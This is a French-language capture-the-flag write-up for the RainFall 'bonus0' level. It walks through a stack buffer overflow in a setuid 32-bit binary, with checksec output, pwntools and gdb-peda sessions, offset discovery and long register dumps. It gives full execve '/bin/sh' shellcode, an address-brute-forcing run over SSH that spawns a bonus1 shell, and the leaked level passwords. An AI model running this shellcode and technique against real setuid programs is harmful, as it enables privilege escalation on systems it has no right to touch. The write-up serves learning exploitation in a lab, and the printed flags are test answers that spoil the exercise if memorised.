# BONUS 0

### Reconnaissance

On se connecte au level9 avec le password : f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728

Nous trouvons un binaire:
```
bonus0@192.168.56.102's password: 
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus0/bonus0
bonus0@RainFall:~$ ls
bonus0
bonus0@RainFall:~$ file bonus0 
bonus0: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xfef8b17db26c56ebfd1e20f17286fae3729a5ade, not stripped
```

Lorqu'on désassemble le binaire, on peux voir qu'il attend 2 inputs (Avec la fonction p, qui fait un appel a read).
Nous somme un peux embété pour de débogage. En effet, les commandes du type `r < <(python -c ....)` vont envoyé la meme commande pour les 2 inputs risque de nous compliqué la tache et faussé notre analyse. Et taper manuellement les commandes serait fastidieux, surtout lors de l'envoie d'adresse.


Nous allons exploité un peu plus la lib <a href="https://github.com/Gallopsled/pwntools">pwn</a> :).

On ouvre 2 terminaux:

1/
```
>>> from pwn import *
>>> p = process('./bonus0')
>>> gdb.attach(p)
[*] running in new terminal: /usr/bin/gdb -q  "./bonus0" 9654
[x] Waiting for debugger
[-] Waiting for debugger: debugger exited! (maybe check /proc/sys/kernel/yama/ptrace_scope)

9655
```

2/
```
/usr/bin/gdb -q  "./bonus0" 9654
Reading symbols from ./bonus0...
(No debugging symbols found in ./bonus0)
Attaching to program: /home/yoginet/Documents/101/rainfall/bonus0/bonus0, process 9654
Reading symbols from /lib32/libc.so.6...
(No debugging symbols found in /lib32/libc.so.6)
Reading symbols from /lib/ld-linux.so.2...
(No debugging symbols found in /lib/ld-linux.so.2)
[----------------------------------registers-----------------------------------]
EAX: 0xfffffe00 
EBX: 0x0 
ECX: 0xff8bd3a0 --> 0x0 
EDX: 0x1000 
ESI: 0xf7f64000 --> 0x1e4d6c 
EDI: 0xf7f64000 --> 0x1e4d6c 
EBP: 0xff8be3a8 --> 0xff8be408 --> 0xff8be458 --> 0x0 
ESP: 0xff8bd360 --> 0xff8be3a8 --> 0xff8be408 --> 0xff8be458 --> 0x0 
EIP: 0xf7f88179 (<__kernel_vsyscall+9>: pop    ebp)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xf7f88173 <__kernel_vsyscall+3>:    mov    ebp,esp
   0xf7f88175 <__kernel_vsyscall+5>:    sysenter 
   0xf7f88177 <__kernel_vsyscall+7>:    int    0x80
=> 0xf7f88179 <__kernel_vsyscall+9>:    pop    ebp
   0xf7f8817a <__kernel_vsyscall+10>:   pop    edx
   0xf7f8817b <__kernel_vsyscall+11>:   pop    ecx
   0xf7f8817c <__kernel_vsyscall+12>:   ret    
   0xf7f8817d:  nop
[------------------------------------stack-------------------------------------]
0000| 0xff8bd360 --> 0xff8be3a8 --> 0xff8be408 --> 0xff8be458 --> 0x0 
0004| 0xff8bd364 --> 0x1000 
0008| 0xff8bd368 --> 0xff8bd3a0 --> 0x0 
0012| 0xff8bd36c --> 0xf7e70e57 (<read+39>:     mov    ebx,eax)
0016| 0xff8bd370 --> 0xff8be3a8 --> 0xff8be408 --> 0xff8be458 --> 0x0 
0020| 0xff8bd374 --> 0xf7f9f740 (pop    edx)
0024| 0xff8bd378 --> 0xffffffff 
0028| 0xff8bd37c --> 0xf7e70e30 (<read>:        push   esi)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0xf7f88179 in __kernel_vsyscall ()
gdb-peda$
```

Le premier nous permettra d'envoyé nos payload de test avec la commande :
```
>>> p.sendline(PAYLOAD)
```

Le second fonctionne de la mème manière que d'habitude. Il va nous permettre de mettre nos breakpoint, voir la stack, ect...

Après quelques test, on se rend compte qu'on segfault : `0x42424242 in ?? ()`

On cherche l'offset avec pattern create:
```
gdb-peda$ pattern create 50
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
```

On envoie le pattern sur le second offset
```
>>> p.sendline("A" * 50)
>>> p.sendline("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA")
```

Ce qui nous donne:
```
Stopped reason: SIGSEGV
0x416e4141 in ?? ()
gdb-peda$ pattern offset 0x416e4141
1097744705 found at offset: 13
```

On test:
```
>>> p.sendline("A" * 50)
>>> p.sendline("B" * 13 + "CCCC" + "D" * 33)
```

```
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xffffffff 
EDX: 0xffffffff 
ESI: 0xf7fae000 --> 0x1e4d6c 
EDI: 0xf7fae000 --> 0x1e4d6c 
EBP: 0x42424242 ('BBBB')
ESP: 0xffbbfcf0 --> 0x444444 ('DDD')
EIP: 0x43434343 ('CCCC')
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x43434343
[------------------------------------stack-------------------------------------]
0000| 0xffbbfcf0 --> 0x444444 ('DDD')
0004| 0xffbbfcf4 --> 0xffbbfd94 --> 0xffbc1490 ("./bonus0")
0008| 0xffbbfcf8 --> 0xffbbfd9c --> 0xffbc1499 ("LESS_TERMCAP_md=\033[1;36m")
0012| 0xffbbfcfc --> 0xffbbfd24 --> 0x0 
0016| 0xffbbfd00 --> 0xffbbfd34 --> 0x59ec196b 
0020| 0xffbbfd04 --> 0xf7ffdb40 --> 0xf7ffdae0 --> 0xf7fcb3e0 --> 0xf7ffd980 --> 0x0 
0024| 0xffbbfd08 --> 0xf7fcb410 --> 0x80482ae ("GLIBC_2.0")
0028| 0xffbbfd0c --> 0xf7fae000 --> 0x1e4d6c 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x43434343 in ?? ()
```

On arrive a re écrire sur EIP. 


### Exploitation

On met notre payload dans notre environnement.
```
export PAYLOAD=$(python -c 'print "\x90\x90\x90\x90\x90\x90\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
```

Ici la manipulation en local de façon a etre sur que notre technique fonctionne:
```
Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
[GCC 9.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> p = process('./bonus0')
[x] Starting local process './bonus0'
[+] Starting local process './bonus0': pid 13255
>>> gdb.attach(p)
[*] running in new terminal: /usr/bin/gdb -q  "./bonus0" 13255
[x] Waiting for debugger
[-] Waiting for debugger: debugger exited! (maybe check /proc/sys/kernel/yama/ptrace_scope)
13260
>>> p.sendline("A" * 50)
>>> p.sendline("B" * 13 + p32(0xff87b73b + 4) + "C" * 33)
>>> 
[*] Stopped process './bonus0' (pid 13255)

```

```
$ /usr/bin/gdb -q  "./bonus0" 13255
Reading symbols from ./bonus0...
(No debugging symbols found in ./bonus0)
Attaching to program: /home/yoginet/Documents/101/rainfall/bonus0/bonus0, process 13255
Reading symbols from /lib32/libc.so.6...
(No debugging symbols found in /lib32/libc.so.6)
Reading symbols from /lib/ld-linux.so.2...
(No debugging symbols found in /lib/ld-linux.so.2)
[----------------------------------registers-----------------------------------]                                                                  
EAX: 0xfffffe00 
EBX: 0x0 
ECX: 0xff878ca0 --> 0x0 
EDX: 0x1000 
ESI: 0xf7f5b000 --> 0x1e4d6c 
EDI: 0xf7f5b000 --> 0x1e4d6c 
EBP: 0xff879ca8 --> 0xff879d08 --> 0xff879d58 --> 0x0 
ESP: 0xff878c60 --> 0xff879ca8 --> 0xff879d08 --> 0xff879d58 --> 0x0 
EIP: 0xf7f7f179 (<__kernel_vsyscall+9>: pop    ebp)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)                                                                   
[-------------------------------------code-------------------------------------]                                                                  
   0xf7f7f173 <__kernel_vsyscall+3>:    mov    ebp,esp
   0xf7f7f175 <__kernel_vsyscall+5>:    sysenter 
   0xf7f7f177 <__kernel_vsyscall+7>:    int    0x80
=> 0xf7f7f179 <__kernel_vsyscall+9>:    pop    ebp
   0xf7f7f17a <__kernel_vsyscall+10>:   pop    edx
   0xf7f7f17b <__kernel_vsyscall+11>:   pop    ecx
   0xf7f7f17c <__kernel_vsyscall+12>:   ret    
   0xf7f7f17d:  nop
[------------------------------------stack-------------------------------------]                                                                  
0000| 0xff878c60 --> 0xff879ca8 --> 0xff879d08 --> 0xff879d58 --> 0x0 
0004| 0xff878c64 --> 0x1000 
0008| 0xff878c68 --> 0xff878ca0 --> 0x0 
0012| 0xff878c6c --> 0xf7e67e57 (<read+39>:     mov    ebx,eax)
0016| 0xff878c70 --> 0xff879ca8 --> 0xff879d08 --> 0xff879d58 --> 0x0 
0020| 0xff878c74 --> 0xf7f96740 (pop    edx)
0024| 0xff878c78 --> 0xffffffff 
0028| 0xff878c7c --> 0xf7e67e30 (<read>:        push   esi)
[------------------------------------------------------------------------------]                                                                  
Legend: code, data, rodata, value
0xf7f7f179 in __kernel_vsyscall ()
gdb-peda$ b*0x080485cb
Breakpoint 1 at 0x80485cb
gdb-peda$ x/35s *((char **)environ)
0xff87b45d:     "LESS_TERMCAP_md=\033[1;36m"
0xff87b475:     "XDG_GREETER_DATA_DIR=/var/lib/lightdm/data/yoginet"
0xff87b4a8:     "_JAVA_OPTIONS=-Dawt.useSystemAAFontSettings=on -Dswing.aatext=true"
0xff87b4eb:     "XDG_CURRENT_DESKTOP=XFCE"
0xff87b504:     "XDG_SESSION_TYPE=x11"
0xff87b519:     "LOGNAME=yoginet"
0xff87b529:     "XDG_SEAT=seat0"
0xff87b538:     "PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
0xff87b576:     "XDG_VTNR=7"
0xff87b581:     "HOME=/home/yoginet"
0xff87b594:     "DISPLAY=:0.0"
0xff87b5a1:     "SSH_AGENT_PID=1332"
0xff87b5b4:     "XDG_SESSION_DESKTOP=lightdm-xsession"
0xff87b5d9:     "TERM=xterm-256color"
0xff87b5ed:     "SHELL=/bin/bash"
0xff87b5fd:     "XDG_SESSION_PATH=/org/freedesktop/DisplayManager/Session0"
0xff87b637:     "XAUTHORITY=/home/yoginet/.Xauthority"
0xff87b65c:     "LANGUAGE="
0xff87b666:     "SESSION_MANAGER=local/kali:@/tmp/.ICE-unix/1303,unix/kali:/tmp/.ICE-unix/1303"
0xff87b6b4:     "SHLVL=1"
0xff87b6bc:     "XDG_SESSION_ID=2"
0xff87b6cd:     "LESS_TERMCAP_me=\033[0m"
0xff87b6e2:     "QT_QPA_PLATFORMTHEME=qt5ct"
0xff87b6fd:     "LESS_TERMCAP_mb=\033[1;31m"
0xff87b715:     "QT_ACCESSIBILITY=1"
0xff87b728:     "WINDOWID=0"
0xff87b733:     "PAYLOAD=\220\220\220\220\220\220\353\037^\211v\b1\300\210F\a\211F\f\260\v\211\363\215N\b\215V\f1ۉ\330@\350\334\377\377\377/bin/sh"
0xff87b76f:     "XDG_SESSION_CLASS=user"
0xff87b786:     "LANG=fr_FR.utf8"
0xff87b796:     "XDG_RUNTIME_DIR=/run/user/1000"
0xff87b7b5:     "SSH_AUTH_SOCK=/tmp/ssh-c4pK2RdbHdRI/agent.1303"
0xff87b7e4:     "LESS_TERMCAP_ue=\033[0m"
0xff87b7f9:     "GDMSESSION=lightdm-xsession"
0xff87b815:     "PANEL_GDK_CORE_DEVICE_EVENTS=0"
0xff87b834:     "COLORFGBG=15;0"
gdb-peda$ x/s 0xff87b733 + 8
0xff87b73b:     "\220\220\220\220\220\220\353\037^\211v\b1\300\210F\a\211F\f\260\v\211\363\215N\b\215V\f1ۉ\330@\350\334\377\377\377/bin/sh"
gdb-peda$ c
Continuing.
[----------------------------------registers-----------------------------------]                                                                  
EAX: 0x0 
EBX: 0x0 
ECX: 0xffffffff 
EDX: 0xffffffff 
ESI: 0xf7f5b000 --> 0x1e4d6c 
EDI: 0xf7f5b000 --> 0x1e4d6c 
EBP: 0x42424242 ('BBBB')
ESP: 0xff879d5c --> 0xff87b73f --> 0x1feb9090 
EIP: 0x80485cb (<main+39>:      ret)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)                                                                   
[-------------------------------------code-------------------------------------]                                                                  
   0x80485c0 <main+28>: call   0x80483b0 <puts@plt>
   0x80485c5 <main+33>: mov    eax,0x0
   0x80485ca <main+38>: leave  
=> 0x80485cb <main+39>: ret    
   0x80485cc:   nop
   0x80485cd:   nop
   0x80485ce:   nop
   0x80485cf:   nop
[------------------------------------stack-------------------------------------]                                                                  
0000| 0xff879d5c --> 0xff87b73f --> 0x1feb9090 
0004| 0xff879d60 --> 0x434343 ('CCC')
0008| 0xff879d64 --> 0xff879e04 --> 0xff87b454 ("./bonus0")
0012| 0xff879d68 --> 0xff879e0c --> 0xff87b45d ("LESS_TERMCAP_md=\033[1;36m")
0016| 0xff879d6c --> 0xff879d94 --> 0x0 
0020| 0xff879d70 --> 0xff879da4 --> 0x398b77b5 
0024| 0xff879d74 --> 0xf7faab40 --> 0xf7faaae0 --> 0xf7f783e0 --> 0xf7faa980 --> 0x0                                                              
0028| 0xff879d78 --> 0xf7f78410 --> 0x80482ae ("GLIBC_2.0")
[------------------------------------------------------------------------------]                                                                  
Legend: code, data, rodata, value

Breakpoint 1, 0x080485cb in main ()
gdb-peda$ ni
[----------------------------------registers-----------------------------------]                                                                  
EAX: 0x0 
EBX: 0x0 
ECX: 0xffffffff 
EDX: 0xffffffff 
ESI: 0xf7f5b000 --> 0x1e4d6c 
EDI: 0xf7f5b000 --> 0x1e4d6c 
EBP: 0x42424242 ('BBBB')
ESP: 0xff879d60 --> 0x434343 ('CCC')
EIP: 0xff87b73f --> 0x1feb9090
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)                                                                   
[-------------------------------------code-------------------------------------]                                                                  
   0xff87b738:  inc    ecx
   0xff87b739:  inc    esp
   0xff87b73a:  cmp    eax,0x90909090
=> 0xff87b73f:  nop
   0xff87b740:  nop
   0xff87b741:  jmp    0xff87b762
   0xff87b743:  pop    esi
   0xff87b744:  mov    DWORD PTR [esi+0x8],esi
[------------------------------------stack-------------------------------------]                                                                  
0000| 0xff879d60 --> 0x434343 ('CCC')
0004| 0xff879d64 --> 0xff879e04 --> 0xff87b454 ("./bonus0")
0008| 0xff879d68 --> 0xff879e0c --> 0xff87b45d ("LESS_TERMCAP_md=\033[1;36m")
0012| 0xff879d6c --> 0xff879d94 --> 0x0 
0016| 0xff879d70 --> 0xff879da4 --> 0x398b77b5 
0020| 0xff879d74 --> 0xf7faab40 --> 0xf7faaae0 --> 0xf7f783e0 --> 0xf7faa980 --> 0x0                                                              
0024| 0xff879d78 --> 0xf7f78410 --> 0x80482ae ("GLIBC_2.0")
0028| 0xff879d7c --> 0xf7f5b000 --> 0x1e4d6c 
[------------------------------------------------------------------------------]                                                                  
Legend: code, data, rodata, value
0xff87b73f in ?? ()
gdb-peda$ ni
[----------------------------------registers-----------------------------------]                                                                  
EAX: 0x0 
EBX: 0x0 
ECX: 0xffffffff 
EDX: 0xffffffff 
ESI: 0xf7f5b000 --> 0x1e4d6c 
EDI: 0xf7f5b000 --> 0x1e4d6c 
EBP: 0x42424242 ('BBBB')
ESP: 0xff879d60 --> 0x434343 ('CCC')
EIP: 0xff87b740 --> 0x5e1feb90
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)                                                                   
[-------------------------------------code-------------------------------------]                                                                  
   0xff87b739:  inc    esp
   0xff87b73a:  cmp    eax,0x90909090
   0xff87b73f:  nop
=> 0xff87b740:  nop
   0xff87b741:  jmp    0xff87b762
   0xff87b743:  pop    esi
   0xff87b744:  mov    DWORD PTR [esi+0x8],esi
   0xff87b747:  xor    eax,eax
[------------------------------------stack-------------------------------------]                                                                  
0000| 0xff879d60 --> 0x434343 ('CCC')
0004| 0xff879d64 --> 0xff879e04 --> 0xff87b454 ("./bonus0")
0008| 0xff879d68 --> 0xff879e0c --> 0xff87b45d ("LESS_TERMCAP_md=\033[1;36m")
0012| 0xff879d6c --> 0xff879d94 --> 0x0 
0016| 0xff879d70 --> 0xff879da4 --> 0x398b77b5 
0020| 0xff879d74 --> 0xf7faab40 --> 0xf7faaae0 --> 0xf7f783e0 --> 0xf7faa980 --> 0x0                                                              
0024| 0xff879d78 --> 0xf7f78410 --> 0x80482ae ("GLIBC_2.0")
0028| 0xff879d7c --> 0xf7f5b000 --> 0x1e4d6c 
[------------------------------------------------------------------------------]                                                                  
Legend: code, data, rodata, value
0xff87b740 in ?? ()
gdb-peda$ ni
[----------------------------------registers-----------------------------------]                                                                  
EAX: 0x0 
EBX: 0x0 
ECX: 0xffffffff 
EDX: 0xffffffff 
ESI: 0xf7f5b000 --> 0x1e4d6c 
EDI: 0xf7f5b000 --> 0x1e4d6c 
EBP: 0x42424242 ('BBBB')
ESP: 0xff879d60 --> 0x434343 ('CCC')
EIP: 0xff87b741 --> 0x895e1feb
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)                                                                   
[-------------------------------------code-------------------------------------]                                                                  
   0xff87b73a:  cmp    eax,0x90909090
   0xff87b73f:  nop
   0xff87b740:  nop
=> 0xff87b741:  jmp    0xff87b762
 | 0xff87b743:  pop    esi
 | 0xff87b744:  mov    DWORD PTR [esi+0x8],esi
 | 0xff87b747:  xor    eax,eax
 | 0xff87b749:  mov    BYTE PTR [esi+0x7],al
 |->   0xff87b762:      call   0xff87b743
       0xff87b767:      das
       0xff87b768:      bound  ebp,QWORD PTR [ecx+0x6e]
       0xff87b76b:      das
                                                                  JUMP is taken                                                                   
[------------------------------------stack-------------------------------------]                                                                  
0000| 0xff879d60 --> 0x434343 ('CCC')
0004| 0xff879d64 --> 0xff879e04 --> 0xff87b454 ("./bonus0")
0008| 0xff879d68 --> 0xff879e0c --> 0xff87b45d ("LESS_TERMCAP_md=\033[1;36m")
0012| 0xff879d6c --> 0xff879d94 --> 0x0 
0016| 0xff879d70 --> 0xff879da4 --> 0x398b77b5 
0020| 0xff879d74 --> 0xf7faab40 --> 0xf7faaae0 --> 0xf7f783e0 --> 0xf7faa980 --> 0x0                                                              
0024| 0xff879d78 --> 0xf7f78410 --> 0x80482ae ("GLIBC_2.0")
0028| 0xff879d7c --> 0xf7f5b000 --> 0x1e4d6c 
[------------------------------------------------------------------------------]                                                                  
Legend: code, data, rodata, value
0xff87b741 in ?? ()
gdb-peda$ c
Continuing.
process 13255 is executing new program: /usr/bin/dash
Warning:
Cannot insert breakpoint 1.
Cannot access memory at address 0x80485cb
```

Sa fonction, en mettant l'adresse de notre stack qui contient le shellcode, il est éxécuté.

Le problème c'est que sur notre vm, les adresses ne sont pas les memes. On va donc utilisé un script python qui va remonté les addresses de la stack jusqu'a ce qu'on tombe sur notre payload :)

Notre départ sera `0xbfffffff` et on remonte de 10 en 10 (+ 8 pour echapé au `PAYLOAD=`). 
Au début de notre shellcode on a quelques `NOP` qui nous permette de compensé si on a un décallage.
Etant donnée que notre environnement ne contient seulement notre payload, nous devrions tombé assez vite dessus.
```
(gdb) x/20s *((char **)environ)
0xbfffff7c:      "PAYLOAD=\220\220\220\220\220\220\353\037^\211v\b1\300\210F\a\211F\f\260\v\211\363\215N\b\215V\f\315\200\061\333\211\330@\315\200\350\334\377\377\377/bin/sh"
0xbfffffb8:      "COLUMNS=117"
0xbfffffc4:      "PWD=/home/user/bonus0"
0xbfffffda:      "LINES=50"
0xbfffffe3:      "/home/user/bonus0/bonus0"
0xbffffffc:      ""
0xbffffffd:      ""
0xbffffffe:      ""
0xbfffffff:      ""
[...]
```

*A noter : Sur la vm, on écrit sur l'EIP a partir du 9eme char du 2eme READ*
```
./bonus0pwn.py 
/home/yoginet/.local/lib/python2.7/site-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in a future release.
  from cryptography.hazmat.backends import default_backend
[+] Connecting to 192.168.56.102 on port 4242: Done
[*] bonus0@192.168.56.102:
    Distro    Ubuntu 12.04
    OS:       linux
    Arch:     i386
    Version:  3.2.0
    ASLR:     Disabled
    Note:     Susceptible to ASLR ulimit trick (CVE-2016-3672)
[*] Run ./bonus0
[+] Opening new channel: './bonus0': Done
[*] Printing env binary :
{'PAYLOAD': '\x90\x90\x90\x90\x90\x90\xeb\x1f^\x89v\x081\xc0\x88F\x07\x89F\x0c\xb0\x0b\x89\xf3\x8dN\x08\x8dV\x0c\xcd\x801\xdb\x89\xd8@\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'}
[*] Sending Payload...
[*] Payload 1 : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA [len = 50]
[*] Payload 2 : BBBBBBBBB\x07\x00CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC [len = 50]
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$ a
[...]
[*] Closed SSH channel with 192.168.56.102
[*] Got EOF while sending in interactive
[*] Run ./bonus0
[+] Opening new channel: './bonus0': Done
[*] Printing env binary :
{'PAYLOAD': '\x90\x90\x90\x90\x90\x90\xeb\x1f^\x89v\x081\xc0\x88F\x07\x89F\x0c\xb0\x0b\x89\xf3\x8dN\x08\x8dV\x0c\xcd\x801\xdb\x89\xd8@\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'}
[*] Sending Payload...
[*] Payload 1 : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA [len = 50]
[*] Payload 2 : BBBBBBBBB\xb7\xff\xff\xbfCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC [len = 50]
[*] Switching to interactive mode
$ a
/bin/sh: 1: a: not found
$ $ ls
ls: cannot open directory .: Permission denied
$ $ cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
$ $ whoami
bonus1
$ $ id
uid=2010(bonus0) gid=2010(bonus0) euid=2011(bonus1) egid=100(users) groups=2011(bonus1),100(users),2010(bonus0)
```

Enjoy :)
